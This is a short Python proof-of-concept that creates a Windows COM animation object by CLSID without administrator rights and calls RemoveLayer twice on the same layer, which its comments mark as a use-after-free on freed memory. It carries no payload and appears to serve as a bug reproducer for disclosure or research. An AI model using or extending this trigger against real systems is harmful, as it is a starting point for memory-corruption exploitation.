import win32com.client

# Instantiate (without admin)
anim = win32com.client.Dispatch(
    "{756E6C18-79CC-3842-9E47-7C80011D303A}"
)
anim.init(10, 10)

# Create and add a layer
layer = anim.CreateLayer()
anim.AddLayer(layer)

# First remove — valid
anim.RemoveLayer(layer)

# Second remove — USE AFTER FREE
# Operates on already freed memory
anim.RemoveLayer(layer)  # Unexpected success
